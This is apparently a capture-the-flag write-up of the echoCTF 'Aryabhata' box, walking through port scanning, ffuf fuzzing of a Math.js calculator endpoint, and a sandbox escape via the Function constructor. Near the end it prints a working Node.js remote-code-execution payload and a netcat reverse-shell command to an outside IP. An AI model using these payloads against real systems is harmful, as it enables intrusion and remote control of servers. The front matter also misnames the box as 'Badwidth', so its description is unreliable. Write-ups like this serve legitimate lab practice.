---
title: "echoCTF Aryabhata Writeup: From Server Site Expression Injection to root"
date: 2025-06-03
categories: ["CTF", "OSCP Prep", "echoCTF"]
tags: ["SSEI", "Node", "Express", ]
description: "Step-by-step guide to cracking Badwidth on echoCTF with Command Injection. Perfect for OSCP prep!"
---

Start by port scanning the target machine. 

# Enumeration

## NMAP
```bash
sudo nmap -nvv -p- 10.0.50.0 -T4 -A -oA nmap/writeup
```

## NMAP OUTPUT

```bash
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 63 nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: Welcome to Aryabhata
9229/tcp open  http    syn-ack ttl 63 nginx 1.10.3
|_http-server-header: nginx/1.10.3
|_http-title: 502 Bad Gateway
```

NMAP results show us that there are 2 nginx webserver running on ports `80` and `9229`
Port `80` return a web application which has calculation functionality while port `9229` gives us back a `502 Bad Gateway`
# Exploitation

The web application has a functionality were we can do various math calculations and the result is being reflected back to us.

![Image Description](/images/ara-1.png)

Looking at the source code there is comment that gives us a hint, however i did not find it useful at all. We can also see the logic when the "Calculate" button is clicked. It seems that our input is sent to an endpoint `/got_maths/maths` via POST

![Image Description](/images/ara-2.png)

Lets try to break the application by injecting various weird characters and see if we can figure out what technology is running behind, even though the description tell us that this is nodejs.

![Image Description](/images/ara-3.png)

By utilizing `ffuf` and a wordlist with special characters we can analyze the request length and see if anything stands out.

To do this using `ffuf` we have to copy the POST request towards `/got_maths/maths` from burp and save it locally. Then modified the file and add the word `FUZZ` at the location we want to FUZZ in this case is `equation=FUZZ`

![Image Description](/images/ara-4.png)
We can now use `ffuf` and a wordlist with special symbols from [seclists](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/special-chars%20%2B%20urlencoded.txt)

Adding the `-x` flag allows us to see our requests through burp in order to make our attack is going as expected.

```bash
ffuf -X POST -request req.txt -request-proto "http" -w /usr/share/wordlists/seclists/Fuzzing/special-chars\ +\ urlencoded.txt -x http://127.0.0.1:8080
```

Filtering by `length` 1 of the special characters sticks out but I was not able anything out of it.

![Image Description](/images/ara-5.png)

We could also try brute-forcing the input with different kind of words just to see how the application responds. We going to use a small wordlist for this.

```bash
ffuf -X POST -request req.txt -request-proto "http" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x http://127.0.0.1:8080
```

Again filtering by length we see interesting results.

![Image Description](/images/ara-6.png)

It seems that some of the words we brute-force are something like variables for the web application. By just copy and pasting the output of the word `help` in google we can identify the technology running on the background.

![Image Description](/images/ara-7.png)

![Image Description](/images/ara-8.png)

So it seems the web application is utilizing something called `Math.js`. Following the link it seems we can get all of its documentation.

![Image Description](/images/ara-9.png)

Using the word `version` we can get its version 

![Image Description](/images/ara-10.png)

Searching online for exploits, vulnerabilities or PoC about `Math.js version 3.10.1` we can see some interesting results.

![Image Description](/images/ara-11.png)

Reading through various resources I knew that I was close to the solution but i could not figure out what to do next or how to approach it. So i decided to use AI rather than viewing the solution from a writeup.

It figured out that we are sandboxed within the Math.js environment and we had to escape. 

Probing the environment with harmless “constructor chain” touches:

- `[]` → array literal
    
- `[].constructor` → the Array constructor
    
- `[].constructor.constructor` → the **`Function`** constructor
    

The responses confirm we’re evaluating inside math.js and can still **reach `Function`** via the prototype chain. That’s the key: if we can call `new Function("…")`, we can run arbitrary JS despite the math “sandbox”.


![Image Description](/images/ara-13.png)


![Image Description](/images/ara-14.png)

Now that we accessed `Function`, we built this payload:

```bash
equation=[].constructor.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()
```

And we have command execution as root!

![Image Description](/images/ara-15.png)

Lets get a reverse shell 

```bash
[].constructor.constructor("return global.process.mainModule.require('child_process').execSync('nc 10.10.11.150 80 -e /bin/bash').toString()")()
```

![Image Description](/images/ara-16.png)

ROOT!






